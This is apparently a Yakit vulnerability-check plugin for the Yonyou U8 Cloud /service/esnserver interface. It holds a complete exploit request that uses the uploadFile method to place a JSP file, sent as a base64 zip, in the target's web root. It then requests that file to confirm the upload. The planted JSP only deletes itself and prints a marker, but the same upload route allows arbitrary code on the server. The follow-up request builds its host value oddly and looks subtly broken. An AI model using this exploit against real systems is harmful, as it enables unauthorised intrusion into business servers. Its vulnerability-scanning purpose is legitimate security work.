script_name: kklt-用友U8cloud系统esnserver接口存在远程命令执行漏洞
content:
yakit.AutoInitYakit()

# 指纹（可按需修改）
# web.icon=="f4370ff0b4763e18159cd7cdf36a4542"

# by h_key

# 检查函数
handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `POST /service/esnserver HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Token: 469ce01522f64366750d1995ca119841
Content-Length: 504

{"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBBQAAAAAAPR5NFm2C9sJVgAAAFYAAAAKAAAAY29tcHJlc3NlZDwlbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPjEyMzEyUEsBAhQAFAAAAAAA9Hk0WbYL2wlWAAAAVgAAAAoAAAAAAAAAAAAAALaBAAAAAGNvbXByZXNzZWRQSwUGAAAAAAEAAQA4AAAAfgAAAAAA","p2":"webapps/u8c_web/swtqsglaz2.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}`

    // 1. 先上传文件
    rsp, req, err := poc.HTTP(
        packet,
        poc.params({"target": addr}),
        poc.https(isTls),
    )
    if err != nil {
        log.Error("upload request failed: %v", err)
        return
    }

    // 2. 验证上传成功
    checkUrl := str.HostPort(addr, port) + "/swtqsglaz2.jsp"
    checkRsp, _, _ := poc.HTTP(
        "GET /swtqsglaz2.jsp HTTP/1.1\r\nHost: {{params(addr)}}\r\nConnection: close\r\n\r\n",
        poc.params({"addr": checkUrl}),
        poc.https(isTls),
    )

    if str.Contains(checkRsp, "12312") { // 上传文件里的特征串
        yakit.Info("%v 用友U8Cloud /service/esnserver 任意文件上传漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("用友U8Cloud /service/esnserver 任意文件上传漏洞"),
            risk.severity("high"),
            risk.titleVerbose("用友U8Cloud /service/esnserver 任意文件上传漏洞"),
            risk.description("用友 U8 Cloud 的 /service/esnserver 接口存在任意文件上传漏洞，攻击者可上传恶意 JSP 文件，进而执行任意代码。"),
            risk.solution("1. 升级到官方最新版本；2. 限制 /service/esnserver 接口的访问权限；3. 对上传文件类型及路径做白名单校验。"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.payload(checkUrl),
            risk.type("upload")
        )
    }
    return
}

# 入口函数
handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }
    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
